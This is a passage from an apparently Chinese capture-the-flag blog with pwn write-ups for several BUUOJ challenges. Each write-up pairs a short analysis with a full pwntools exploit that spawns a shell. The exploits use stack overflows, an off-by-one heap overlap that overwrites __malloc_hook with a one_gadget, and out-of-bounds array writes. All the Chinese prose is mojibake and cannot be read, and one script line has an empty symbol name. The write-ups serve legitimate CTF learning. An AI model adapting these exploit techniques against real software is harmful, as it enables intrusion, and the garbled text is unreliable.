class="hljs-string">&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>shell_addr=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,p32(shell_addr))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="picoctf-2018-buffer"><a href="#picoctf-2018-buffer" class="headerlink" title="picoctf_2018_buffer"></a>picoctf_2018_buffer</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728144721443.png" alt="image-20210728144721443"></p>
<p>checksecçš„æƒ…å†µæ¥çœ‹ä»¥åŠåå­—ï¼Œåº”è¯¥æ˜¯é“æ ˆé¢˜ç›®ï¼Œè¿›å…¥idaçœ‹çœ‹</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728144750715.png" alt="image-20210728144750715"></p>
<p>æ¼æ´ç‚¹åº”è¯¥æ˜¯åœ¨è¿™äº†ï¼Œå­˜åœ¨æ˜æ˜¾æ ˆæº¢å‡º</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728145612076.png" alt="image-20210728145612076"></p>
<p>ç¨‹åºæœ¬èº«è¿˜è•´å«ç€ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¯»å–flagé‡Œé¢çš„å†…å®¹ï¼Œåªè¦é€šè¿‡åˆ¤æ–­å³å¯æ‰“å°å‡ºflag</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728145716640.png" alt="image-20210728145716640"></p>
<p>è€Œè¿™é‡Œçš„a1ï¼Œa2å°±æ˜¯è¯¥å‡½æ•°çš„å‚æ•°ã€‚</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728150414970.png" alt="image-20210728150414970"></p>
<p>æˆåŠŸè·å–flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28765</span>)<br>win_addr=<span class="hljs-number">0x080485CB</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(win_addr)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0xDEADBEEF</span>)+p32(<span class="hljs-number">0xDEADC0DE</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Please enter your string:&quot;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h3><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå¯èƒ½æ˜¯é“å †é¢˜äº†ï¼Œè¿›å…¥idaçœ‹çœ‹ç¨‹åº</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728151846042.png" alt="image-20210728151846042"></p>
<p>æ¼æ´ç‚¹åœ¨äºwriteå‡½æ•°é‡Œé¢</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730125048904.png" alt="image-20210730125048904"></p>
<p>è¿™é‡Œä¼šæŠŠæˆ‘ä»¬ä¹‹å‰ç”³è¯·å †å—æ—¶è¾“å…¥çš„sizeä¸ç°åœ¨è¦å†™å…¥çš„sizeè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæˆ‘ä»¬ç°åœ¨å†™å…¥çš„sizeæ¯”åŸæ¥çš„sizeå¤§10ï¼Œå°±å¯ä»¥å¤šå†™ä¸€ä¸ªï¼Œæ‰€ä»¥æ¼æ´ç‚¹æ˜¯offbyone</p>
<p>æ³„éœ²libcï¼Œå› ä¸ºcallocä¼šæ¸…ç©ºå †å—çš„æ•°æ®ï¼Œæ‰€ä»¥è¿™è¾¹å€Ÿç€æº¢å‡ºï¼ŒæŠŠis_mmapä½æ”¹ä¸º1ï¼Œå°±ä¸ä¼šè¢«æ¸…ç©ºæ•°æ®ï¼Œå€Ÿæ­¤æŠŠlibcæ³„éœ²å‡ºæ¥</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730215233503.png" alt="image-20210730215233503"></p>
<p>ç„¶åå°±åˆ©ç”¨offbyoneä¿®æ”¹å †å—çš„sizeï¼Œåˆ¶é€ overlopï¼Œä¿®æ”¹è¢«è¦†ç›–çš„å †å—çš„fdæŒ‡é’ˆï¼Œç„¶åæŠŠå †å—ç”³è¯·åˆ°malloc_hookä¸Šå»</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730233057769.png" alt="image-20210730233057769"></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730233446054.png" alt="image-20210730233446054"></p>
<p>è¿™è¾¹æˆ‘å·²ç»æˆåŠŸå†™è¿›å»äº†ï¼Œä½†æ˜¯æ²¡æœ‰getshellï¼Œå››ç§éƒ½æ²¡åŠæ³•getshellï¼Œé‚£æ¥ä¸‹æ¥ï¼Œå°±æœ‰å¾ˆå¤šå¤„ç†æ–¹å¼äº†</p>
<ul>
<li>è½¬è€Œå»ä¿®æ”¹free_hookå‡½æ•°</li>
<li>åˆ©ç”¨reallocè°ƒæ•´æ ˆå¸§</li>
<li>house of orangeï¼ˆé€šæ€2.23ä»¥åŠ2.24ï¼‰</li>
</ul>
<p>è¿™è¾¹æˆ‘ä½¿ç”¨reallocè°ƒæ•´æ ˆå¸§ï¼Œå…¶ä»–æ–¹æ³•åç»­ä¼šæ›´æ–°çš„ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“åç»­æ˜¯å¤šä¹…~ï¼‰</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002134507.png" alt="image-20210731002134507"></p>
<p>è¿™è¾¹å¯ä»¥çœ‹è§ï¼Œå¹¶ä¸ä¼šä¸ºNULLï¼Œæ‰€ä»¥one_gadgetæ¡ä»¶æ²¡æœ‰è¾¾æˆï¼Œç„¶åçœ‹çœ‹realloc,ä¼šå‹æ ˆ</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002037708.png" alt="image-20210731002037708"></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002752890.png" alt="image-20210731002752890"></p>
<p>å‘ç°ï¼Œå…¶å®å‹æ ˆå¯¼è‡´çš„rsp-0x8ï¼Œå·²ç»è®©one_gadgetçš„æ¡ä»¶è¾¾æˆäº†ï¼Œæ‰€ä»¥å°±ä¸ç”¨å†å»æ‰¾äº†</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731001850853.png" alt="image-20210731001850853"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./roarctf_2019_easy_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size+<span class="hljs-number">10</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">&#x27;\x93&#x27;</span>)<br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c4b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>rlh=libc_base+libc.sym[<span class="hljs-string">&#x27;&#x27;</span>]<br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0x4526a</span><br>log.success(<span class="hljs-string">&quot;libc base==&gt;0x%x&quot;</span> %libc_base)<br>log.success(<span class="hljs-string">&quot;__malloc_hook==&gt;0x%x&quot;</span> %mlh)<br>log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;\xe1&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xd8</span>)<span class="hljs-comment">#2</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#5</span><br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(ogg)+p64(realloc)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br><br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x10</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a>wustctf2020_getshell_2</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808202602382.png" alt="image-20210808202602382"></p>
<p>å…ˆchecksecä¸€ä¸‹ï¼Œ32ä½ï¼Œå¼€å¯ä¿æŠ¤åªæœ‰nx</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808203034653.png" alt="image-20210808203034653"></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808205220758.png" alt="image-20210808205220758"></p>
<p>idaé‡Œé¢ååˆ†ç®€å•ï¼Œæ¼æ´ç‚¹å°±è¿™ä¹ˆä¸€äº›ä¸œè¥¿ï¼Œè¯´æ˜å°±æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œè€Œæº¢å‡ºç®—ä¸Šè¿”å›åœ°å€ï¼Œåªæœ‰å…«ä¸ªå­—èŠ‚ï¼Œç»™çš„åé—¨å‡½æ•°æ˜¯æ— æ³•ä½¿ç”¨çš„ï¼Œé‚£ä¹ˆå¦‚æœæŒ‰ç…§åŸæ¥çš„æ„é€ æ–¹æ³•ï¼Œå­—èŠ‚æ•°æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºåŠ ä¸Šè¿”å›åœ°å€ï¼Œé‚£æ˜æ˜¾æ˜¯è¦åäºŒä¸ªå­—èŠ‚ã€‚ç„¶åè¿™è¾¹çš„å­—ç¬¦è¦å»æ‰¾shï¼Œåªæœ‰shä¹Ÿæ˜¯å¯ä»¥getshellçš„ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œé‚£å¦‚æœè¦ä¸éœ€è¦è¿”å›åœ°å€ï¼Œé‚£å°±è¦å»è·³è½¬åˆ°è¿™è¾¹çš„ç¨‹åºé‡Œé¢å·²ç»æœ‰çš„call _systemï¼Œå°±å¯ä»¥ä¸éœ€è¦è¿”å›åœ°å€ï¼Œå› ä¸ºcallæŒ‡ä»¤ä¼šè‡ªåŠ¨çš„å°†ä¸‹ä¸€æ¡æŒ‡ä»¤å‹å…¥æ ˆä¸­ä½œä¸ºè¿”å›åœ°å€</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808205011413.png" alt="image-20210808205011413"></p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27986</span>)<br>sys = <span class="hljs-number">0x8048529</span><br>sh = <span class="hljs-number">0x08048670</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1c</span> + p32(sys) + p32(sh)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="qctf-2018-stack2"><a href="#qctf-2018-stack2" class="headerlink" title="qctf_2018_stack2"></a>qctf_2018_stack2</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808210516960.png" alt="image-20210808210516960"></p>
<p>checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œä¸”æœ‰nxä»¥åŠcanaryï¼Œé‚£å°±è¦å…ˆå»å¯»æ‰¾æ€ä¹ˆæ³„éœ²canaryäº†ï¼Œä¸ç„¶æ˜¯æ²¡æ³•åšçš„</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808214029860.png" alt="image-20210808214029860"></p>
<p>åˆ†æäº†ä¸€ä¸‹ç¨‹åºçš„åŠŸèƒ½ï¼Œä¸å­˜åœ¨æº¢å‡ºç‚¹ï¼Œè¾“å…¥å‡½æ•°ä¹Ÿéƒ½æ˜¯ç”¨çš„scanfï¼Œåªæœ‰è¿™ä¸ªåœ°æ–¹åº”è¯¥æ˜¯æœ‰é—®é¢˜çš„ï¼Œé¦–å…ˆè¿™ä¸ªæ•°ç»„çš„æ˜¯åœ¨æ ˆä¸Šçš„ï¼Œè€Œæ•°ç»„ä¸‹æ ‡æˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œé‚£å°±å­˜åœ¨äº†æ•°ç»„è¶Šç•Œé—®é¢˜äº†ã€‚å¹¶ä¸”ç»™äº†ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œé‚£å°±å¯ä»¥é€ä¸ªå­—èŠ‚çš„è¾“å…¥è¿›å»ï¼Œè¦†ç›–è¿”å›åœ°å€ï¼Œè¿™æ ·ä¹Ÿå°±ä¸éœ€è¦å»æ³„éœ²canaryäº†</p>
<p>ç„¶åå°±æ˜¯æ•°ç»„çš„åç§»ï¼Œç›´æ¥çœ‹idaçš„åæ±‡ç¼–æ˜¯é”™è¯¯çš„ï¼Œä¸ºä»€ä¹ˆä¼šé”™ï¼Ÿ</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808222850151.png" alt="image-20210808222850151"></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808222112204.png" alt="image-20210808222112204"></p>
<p>æ±‡ç¼–ä»£ç å¯ä»¥è§£æƒ‘ï¼šç”±äºè¿™è¾¹çš„å¤„ç†ä¸åŒï¼Œå¯¼è‡´ebpçš„ä¸‹æ–¹å¹¶ä¸æ˜¯è¿”å›åœ°å€ï¼Œè€Œæ˜¯è¿˜æœ‰ä¸€æ®µè·ç¦»ï¼Œå°±è¦å»è°ƒè¯•è·å¾—äº†</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808225803029.png" alt="image-20210808225803029"></p>
<p>æˆ‘é€‰æ‹©åœ¨ä¸‹æ ‡ä¸º1çš„ä½ç½®è¾“å…¥è°ƒè¯•ï¼Œè€Œè¿™è¾¹[ebp+eax*1-0x70]å°±æ˜¯è¾“å…¥çš„æ•°æœ€ç»ˆä¼šå­˜æ”¾çš„åœ°æ–¹ï¼Œå› ä¸ºæˆ‘è¾“çš„æ˜¯0ï¼Œæ‰€ä»¥å¯ä»¥ç®—å‡ºçš„ebp-0x70å°±æ˜¯æ•°ç»„çš„èµ·å§‹åœ°å€ï¼Œè¿™æ ·åªè¦å†å»ç®—ä¸€ä¸‹è¿”å›åœ°å€åˆ°è¿™çš„åç§»å³å¯</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808230055266.png" alt="image-20210808230055266"></p>
<p>ç®—å‡ºåç§»ä¹‹åå°±æ˜¯åˆ©ç”¨æ•°ç»„è¶Šç•ŒæŠŠåé—¨å‡½æ•°åœ°å€å†™å…¥åˆ°è¿”å›åœ°å€</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808221957029.png" alt="image-20210808221957029"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25028</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p.recvuntil(<span class="hljs-string">&quot;have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>get_shell = [<span class="hljs-number">0x9b</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x08</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>	p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;change&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x84</span>+i))<br>	p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(get_shell[i]))<br>p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812160620361.png" alt="image-20210812160620361"></p>
<p>å…ˆchecksecä¸€ä¸‹ï¼Œ64ä½ï¼Œå¼€å¯äº†nxå’Œcanaryï¼Œå¯èƒ½è¦æ³„éœ²canaryï¼Œè¿›å…¥idaåˆ†æä¸€ä¸‹</p>
<p>è¿›å…¥ç¨‹åºï¼Œæ˜¯ä¸ªç”¨c++ç¼–å†™çš„ç¨‹åºï¼Œçœ‹èµ·æ¥æœ‰äº›è´¹åŠ›</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812162011685.png" alt="image-20210812162011685"></p>
<p>é¦–å…ˆæ‰¾åˆ°äº†ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œé‚£ä¹ˆå°±å†å»æ‰¾æ‰¾è¾“å…¥ç‚¹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æº¢å‡ºï¼Œä»¥åŠæ‰¾æ‰¾æœ‰æ²¡æœ‰å‡½æ•°è°ƒç”¨çš„åœ°æ–¹ã€‚ç„¶åå¯ä»¥å‘ç°ï¼Œè¾“å…¥ç‚¹æ˜¯ä¸å­˜åœ¨æº¢å‡ºåˆ°è¿”å›åœ°å€çš„ï¼Œä½†æ˜¯å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªèƒ½è¿›è¡Œå‡½æ•°è°ƒç”¨çš„åœ°æ–¹</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812162329071.png" alt="image-20210812162329071"></p>
<p>åœ¨æ•´ä¸ªç¨‹åºçš„æœ€åï¼Œè¿›è¡Œå¯†ç éªŒè¯ï¼Œå¦‚æœé€šè¿‡å°±ä¼šè¿›è¡Œå‡½æ•°è°ƒç”¨ã€‚é‚£ä¹ˆï¼Œå°±å»æ‰¾æ‰¾è¿™ä¸ªå‡½æ•°è°ƒç”¨ä»å“ªé‡Œä¼ å…¥ï¼Œæ˜¯å¦å¯ä»¥ä¿®æ”¹ï¼Ÿä»¥åŠæ€ä¹ˆé€šè¿‡æ£€éªŒ</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165314541.png" alt="image-20210812165314541"></p>
<p>é¦–å…ˆé€šè¿‡éªŒè¯ï¼ŒæŠŠè¿™çš„è´¦å·å¯†ç è¾“å…¥è¿›å»å³å¯</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165836228.png" alt="image-20210812165836228"></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165850893.png" alt="image-20210812165850893"></p>
<p>ç„¶åå°±æ˜¯è¦è¿›è¡Œè¦†ç›–ï¼ŒæŠŠv8è¦†ç›–ä¸ºåé—¨å‡½æ•°ï¼Œv8åˆæ¥è‡ªvulnï¼Œè€Œvulnä¼¼ä¹ä¸æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å˜é‡ã€‚ä½†æ˜¯å»æŸ¥æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çŸ¥é“æœ€åçš„å‡½æ•°è°ƒç”¨ï¼Œè¡¨ç°æ˜¯call raxï¼Œé‚£æ˜¯å¦å¯ä»¥å»ä¿®æ”¹raxçš„æ•°æ®å‘¢ï¼Ÿ</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812170456157.png" alt="image-20210812170456157"></p>
<p>è¿™é‡Œå¾ˆæœ‰æ„æ€ï¼Œåœ¨call raxå‰å¯ä»¥è¿½æº¯åˆ°raxçš„å€¼æ¥è‡ªæ ˆä¸Šä¸€ä¸ªæ•°æ®ï¼Œå¯ä»¥å»çœ‹çœ‹èƒ½ä¸èƒ½è¦†ç›–</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812172747784.png" alt="image-20210812172747784"></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812172859005.png" alt="image-20210812172859005"></p>
<p>è¿™é‡Œä¼ å…¥çš„raxçš„å€¼å°±æ˜¯æºå¤´ï¼Œè€Œè¿™é‡Œçš„å€¼æ˜¯æ ˆä¸Šçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬æ˜¯å¯ä»¥è¦†ç›–çš„ï¼Œå°±æ˜¯åœ¨ç¬¬äºŒä¸ªè¾“å…¥ç‚¹è¾“å…¥å¯†ç çš„åœ°æ–¹</p>
<p>æˆåŠŸgetshell</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812164617984.png" alt="image-20210812164617984"></p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29528</span>)<br>shell = <span class="hljs-number">0x400E88</span><br><br>p.recvuntil(<span class="hljs-string">&quot;username:&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;password:&quot;</span>)<br>payload = <span class="hljs-string">&quot;2jctf_pa5sw0rd&quot;</span>.ljust(<span class="hljs-number">0x48</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(shell)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="mrctf2020-easyrop"><a href="#mrctf2020-easyrop" class="headerlink" title="mrctf2020_easyrop"></a>mrctf2020_easyrop</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812175441484.png" alt="image-20210812175441484"></p>
<p>checksecï¼Œ64ä½ï¼Œåªå¼€å¯nx</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812180035772.png" alt="image-20210812180035772"></p>
<p>é¦–å…ˆç¨‹åºå­˜åœ¨åé—¨ï¼Œä½†æ˜¯ä¾ç…§é€»è¾‘æ˜¯ä¸å¯èƒ½è¿è¡Œåˆ°åé—¨çš„ï¼Œæ‰€ä»¥éœ€è¦åŠ«æŒripæ‰§è¡Œåé—¨å‡½æ•°</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812181120347.png" alt="image-20210812181120347"></p>
<p>æ‰€æœ‰çš„è¾“å…¥ç‚¹éƒ½æ˜¯ä»var_310å¼€å§‹è¾“å…¥çš„ï¼Œç„¶è€Œæœ€å¤§çš„è¾“å…¥é•¿åº¦ä¹Ÿä¸è¿‡æ˜¯0x300ï¼Œä¸å¤Ÿè¦†ç›–åˆ°è¿”å›åœ°å€</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812181040014.png" alt="image-20210812181040014"></p>
<p>ä»”ç»†åˆ†æç¨‹åºï¼Œå¯ä»¥å‘ç°è¿™è¾¹æœ‰ä¸ªæ•°ç»„è¶Šç•Œï¼Œè¿™é‡Œçš„a1æ˜¯var_310ï¼Œæ‰€ä»¥å¯ä»¥å…ˆç”¨åˆ«çš„å‡½æ•°è¾“å…¥æ•°æ®ï¼Œç„¶åè¶Šç•Œè¦†ç›–è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°</p>
